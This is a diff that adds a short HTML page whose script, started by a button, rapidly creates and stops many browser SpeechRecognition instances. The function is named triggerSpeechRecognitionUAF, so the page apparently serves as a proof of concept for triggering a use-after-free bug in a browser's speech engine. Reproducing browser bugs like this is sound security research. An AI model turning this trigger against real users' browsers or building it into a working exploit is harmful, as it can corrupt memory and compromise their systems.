@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Speech Recognition</title>
+</head>
+<body>
+    <h1>Speech Recognition</h1>
+    <button id="startButton">Start Speech Recognition</button>
+    <p id="infoMessage"></p>
+
+    <script>
+        let recognizers = [];
+        const MAX_RECOGNIZERS = 100; // Limit the number of recognizers to 100
+        const RECOGNITION_DURATION = 200; // Time in milliseconds for each recognition
+
+        function createSpeechRecognizers(count) {
+            for (let i = 0; i < count; i++) {
+                if (recognizers.length >= MAX_RECOGNIZERS) return; // Limit recognizers
+
+                let recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
+                recognizers.push(recognition);
+
+                recognition.lang = 'en-US';
+                recognition.interimResults = false;
+                recognition.maxAlternatives = 1;
+
+                recognition.onresult = function(event) {
+                    let transcript = event.results[0][0].transcript;
+                    console.log('Transcript from recognizer', i, ':', transcript);
+                };
+
+                recognition.onend = function() {
+                    console.log('SpeechRecognition ended for instance:', i);
+                    recognizers.splice(recognizers.indexOf(recognition), 1); // Remove ended recognizer
+                };
+
+                recognition.start();
+                setTimeout(() => {
+                    recognition.stop();
+                }, RECOGNITION_DURATION); 
+            }
+        }
+
+        function triggerSpeechRecognitionUAF() {
+            let totalRuns = 0;
+            const interval = setInterval(() => {
+                createSpeechRecognizers(10); // Create 10 recognizers at a time
+
+                if (totalRuns >= 100 || recognizers.length >= MAX_RECOGNIZERS) {
+                    clearInterval(interval); // Stop after 100 runs or reaching the limit
+                }
+                totalRuns++;
+            }, 150); // Adjust timing as needed
+        }
+
+        document.getElementById('startButton').addEventListener('click', () => {
+            triggerSpeechRecognitionUAF();
+        });
+    </script>
+</body>
+</html>
